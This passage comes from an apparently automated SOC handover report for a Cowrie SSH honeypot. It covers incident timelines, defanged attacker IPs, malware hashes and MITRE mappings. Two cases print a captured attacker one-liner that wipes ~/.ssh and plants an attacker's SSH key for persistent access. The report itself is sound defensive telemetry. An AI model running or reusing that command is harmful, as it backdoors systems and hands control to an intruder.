| `2026-06-09 20:50:32` | `cowrie.client.kex` |
| `2026-06-09 20:50:32` | `cowrie.login.success` |
| `2026-06-09 20:50:33` | `cowrie.session.params` |
| `2026-06-09 20:50:33` | `cowrie.command.input` |
| `2026-06-09 20:50:33` | `cowrie.command.failed` |
| `2026-06-09 20:50:33` | `cowrie.log.closed` |
| `2026-06-09 20:50:33` | `cowrie.session.params` |
| `2026-06-09 20:50:33` | `cowrie.command.input` |
| `2026-06-09 20:50:33` | `cowrie.session.file_download` |
| `2026-06-09 20:50:33` | `cowrie.log.closed` |
| `2026-06-09 20:50:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.190[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.164.190[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-132fd5e9d327

| Field | Detail |
|---|---|
| **Source IP** | `43.164.190[.]40` |
| **First Seen** | 2026-06-09 20:50 |
| **Last Seen** | 2026-06-09 20:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:50:35` | `cowrie.session.connect` |
| `2026-06-09 20:50:35` | `cowrie.client.version` |
| `2026-06-09 20:50:36` | `cowrie.client.kex` |
| `2026-06-09 20:50:36` | `cowrie.login.success` |
| `2026-06-09 20:50:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.190[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.164.190[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cafc2ce07d5

| Field | Detail |
|---|---|
| **Source IP** | `43.164.190[.]40` |
| **First Seen** | 2026-06-09 20:54 |
| **Last Seen** | 2026-06-09 20:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:54:36` | `cowrie.session.connect` |
| `2026-06-09 20:54:36` | `cowrie.client.version` |
| `2026-06-09 20:54:36` | `cowrie.client.kex` |
| `2026-06-09 20:54:37` | `cowrie.login.success` |
| `2026-06-09 20:54:37` | `cowrie.session.params` |
| `2026-06-09 20:54:37` | `cowrie.command.input` |
| `2026-06-09 20:54:37` | `cowrie.command.failed` |
| `2026-06-09 20:54:37` | `cowrie.log.closed` |
| `2026-06-09 20:54:38` | `cowrie.session.params` |
| `2026-06-09 20:54:38` | `cowrie.command.input` |
| `2026-06-09 20:54:38` | `cowrie.session.file_download` |
| `2026-06-09 20:54:38` | `cowrie.log.closed` |
| `2026-06-09 20:54:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.190[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.164.190[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d33736abef9

| Field | Detail |
|---|---|
| **Source IP** | `43.164.190[.]40` |
| **First Seen** | 2026-06-09 20:54 |
| **Last Seen** | 2026-06-09 20:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 20:54:40` | `cowrie.session.connect` |
| `2026-06-09 20:54:40` | `cowrie.client.version` |
| `2026-06-09 20:54:40` | `cowrie.client.kex` |
| `2026-06-09 20:54:40` | `cowrie.login.success` |
| `2026-06-09 20:54:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.190[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.164.190[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-189d31729462

| Field | Detail |
|---|---|
| **Source IP** | `103.89.136[.]111` |
| **First Seen** | 2026-06-09 21:12 |
| **Last Seen** | 2026-06-09 21:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 21:12:18` | `cowrie.session.connect` |
| `2026-06-09 21:12:18` | `cowrie.client.version` |
| `2026-06-09 21:12:18` | `cowrie.client.kex` |
| `2026-06-09 21:12:18` | `cowrie.login.success` |
| `2026-06-09 21:12:18` | `cowrie.session.params` |
| `2026-06-09 21:12:18` | `cowrie.command.input` |
| `2026-06-09 21:12:18` | `cowrie.command.failed` |
| `2026-06-09 21:12:18` | `cowrie.log.closed` |
| `2026-06-09 21:12:19` | `cowrie.session.params` |
| `2026-06-09 21:12:19` | `cowrie.command.input` |
| `2026-06-09 21:12:19` | `cowrie.session.file_download` |
| `2026-06-09 21:12:19` | `cowrie.log.closed` |
| `2026-06-09 21:12:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.89.136[.]111` to AbuseIPDB if not already reported
- [ ] Block `103.89.136[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9155f6512a12

| Field | Detail |
|---|---|
| **Source IP** | `103.89.136[.]111` |
| **First Seen** | 2026-06-09 21:12 |
| **Last Seen** | 2026-06-09 21:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 21:12:27` | `cowrie.session.connect` |
| `2026-06-09 21:12:27` | `cowrie.client.version` |
| `2026-06-09 21:12:27` | `cowrie.client.kex` |
| `2026-06-09 21:12:27` | `cowrie.login.success` |
| `2026-06-09 21:12:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.89.136[.]111` to AbuseIPDB if not already reported
- [ ] Block `103.89.136[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `143.110.178[.]27` | **382** | 2026-06-09 18:09 | 2026-06-09 21:49 | 310m | 0 | `T1592` | 🟠 MEDIUM |
| `128.199.25[.]179` | **323** | 2026-06-09 18:09 | 2026-06-09 21:49 | 207m | 0 | `T1592` | 🟠 MEDIUM |
| `101.126.82[.]218` | **29** | 2026-06-09 20:06 | 2026-06-09 20:25 | 50m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `20.12.41[.]6` | **29** | 2026-06-09 18:12 | 2026-06-09 19:09 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `121.229.191[.]90` | **28** | 2026-06-09 19:35 | 2026-06-09 20:24 | 46m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `206.167.33[.]157` | **20** | 2026-06-09 20:51 | 2026-06-09 21:28 | 38m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `43.164.190[.]40` | **16** | 2026-06-09 20:20 | 2026-06-09 20:56 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `122.51.207[.]35` | **13** | 2026-06-09 20:13 | 2026-06-09 20:55 | 17m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `138.124.99[.]219` | **13** | 2026-06-09 19:09 | 2026-06-09 19:46 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `138.124.158[.]150` | **7** | 2026-06-09 19:46 | 2026-06-09 20:09 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `103.89.136[.]111` | **6** | 2026-06-09 19:50 | 2026-06-09 20:08 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `148.66.132[.]204` | **6** | 2026-06-09 18:09 | 2026-06-09 18:20 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `130.131.161[.]148` | **2** | 2026-06-09 19:43 | 2026-06-09 19:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `46.6.124[.]216` | **2** | 2026-06-09 19:35 | 2026-06-09 19:41 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.120[.]147` | 1 | 2026-06-09 19:29 | 2026-06-09 19:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `144.79.133[.]50` | 1 | 2026-06-09 21:47 | 2026-06-09 21:47 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `152.200.181[.]42` | 1 | 2026-06-09 21:43 | 2026-06-09 21:44 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `165.227.153[.]175` | 1 | 2026-06-09 21:43 | 2026-06-09 21:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.168.60[.]146` | 1 | 2026-06-09 18:10 | 2026-06-09 18:10 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.9[.]22` | 1 | 2026-06-09 18:34 | 2026-06-09 18:34 | 6s | 0 | `T1592` | 🟢 LOW |
| `185.113.139[.]84` | 1 | 2026-06-09 19:59 | 2026-06-09 20:00 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `188.240.59[.]54` | 1 | 2026-06-09 20:00 | 2026-06-09 20:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `201.63.223[.]140` | 1 | 2026-06-09 19:32 | 2026-06-09 19:32 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.246.200[.]113` | 1 | 2026-06-09 18:31 | 2026-06-09 18:31 | 30s | 0 | `T1592` | 🟢 LOW |
| `31.14.254[.]99` | 1 | 2026-06-09 20:06 | 2026-06-09 20:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `36.93.249[.]106` | 1 | 2026-06-09 19:36 | 2026-06-09 19:36 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `42.51.41[.]252` | 1 | 2026-06-09 19:05 | 2026-06-09 19:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.196.236[.]141` | 1 | 2026-06-09 19:48 | 2026-06-09 19:48 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.195[.]113` | 1 | 2026-06-09 20:08 | 2026-06-09 20:08 | 15s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `43.164.190[.]40` | KR | ACEVILLE PTE.LTD. | **100** ⚠️ | 0 |
| `66.132.195[.]113` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `31.14.254[.]99` | GB | Infrawatch Limited | **100** ⚠️ | 13 |
| `122.51.207[.]35` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 3 |
| `148.66.132[.]204` | SG | Godaddy.com | **100** ⚠️ | 50 |
| `103.89.136[.]111` | IN | Planetcast Media Services Limited | **100** ⚠️ | 29 |
| `206.167.33[.]157` | OM | Awaser Oman LLC | **100** ⚠️ | 6 |
| `165.227.153[.]175` | DE | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `138.124.99[.]219` | DE | AEZA GROUP LLC | **100** ⚠️ | 26 |
| `36.93.249[.]106` | ID | PT Telekomunikasi Indonesia | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 223 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 98 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 68 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 37 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 37 |

---

## 🔕 False Positive Summary (12 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 970 cases |
| Tool 34  | Credential Extractor        | ✅ 166 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 40 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 12 filtered (1.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 29 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 67 priority case(s) shown individually · 29 recon entry/entries in table (14 group(s) consolidating 876 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-09T21:50:55Z_
